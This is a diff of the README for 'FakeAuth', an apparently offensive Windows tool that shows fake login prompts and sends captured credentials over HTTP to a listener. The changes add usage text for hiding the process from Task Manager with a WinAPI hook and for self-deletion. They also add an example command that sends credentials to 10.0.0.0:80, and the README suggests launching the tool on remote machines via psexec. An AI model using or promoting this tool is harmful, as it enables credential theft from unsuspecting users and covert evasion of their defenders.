@@ -5,20 +5,23 @@ FakeAuth is a tool that prompts for user credentials and exfiltrates it with HTT
 Inspired by following projects
 1) hlldz's PICKL3 [https://github.com/hlldz/pickl3](https://github.com/hlldz/pickl3)
 
-Expect to find dirty code and some bugs, this is some of first versions ;)
+Expect dirty code and some bugs ;)
 
 ## Installation
 
 No special requirements
 
 
-## Usage
+## Usage v1.01
 
 ```
-Usage: FakeAuth.exe <type> <count> <title> <message> <listener>
+Usage:   FakeAuth.exe <hide> <mode> <type> <count> <title> <message> <listener>
+Example: FakeAuth.exe 1 1 1 10 window_title enter_creds 10.0.0.0:80\n
+hide     (integer) -> Hide Process in Taskmgr by WinAPI-Hook (0,1 - requires FakeAuth.dll) 
+mode     (integer) -> Self-Delete at process stop (0,1) - .dll only possible if taskmgr closed!
 type     (integer) -> Prompt Style (1,2)
 count    (long)    -> How many prompts after invalid Credentials (0,1,2,..,n 0=unlimited)
-title    (string)  -> Prompt title (type=1 only)
+title    (string)  -> Prompt title (visible in type=1 only)
 message  (string)  -> Window message
 listener (string)  -> HTTP exfiltration listener (10.0.0.0:80), if not specified print stdout
 ```
@@ -28,6 +31,3 @@ Best way to use is to start on a remote machines in a user session. (psexec or o
 ## Contact
 
 @atn1ght1 Twitter
-
-## License
-[MIT](https://choosealicense.com/licenses/mit/)
